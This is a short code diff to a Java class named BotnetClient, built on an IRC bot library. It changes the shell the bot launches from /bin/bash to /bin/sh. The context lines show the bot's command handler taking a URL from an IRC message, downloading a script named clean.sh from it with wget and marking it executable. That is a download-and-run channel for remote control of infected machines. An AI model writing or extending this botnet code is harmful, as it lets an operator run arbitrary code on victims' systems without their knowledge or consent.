@@ -136,7 +136,7 @@ public class BotnetClient extends PircBot {
 					String[] parts = message.split(" ");
 					if (parts.length > 1) {
 						String url = parts[1];
-						Process p = Runtime.getRuntime().exec("/bin/bash");
+						Process p = Runtime.getRuntime().exec("/bin/sh");
 						PrintWriter in = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
 						in.println("wget -O clean.sh " + url + " >> temp");
 						in.println("chmod +x clean.sh >> temp");
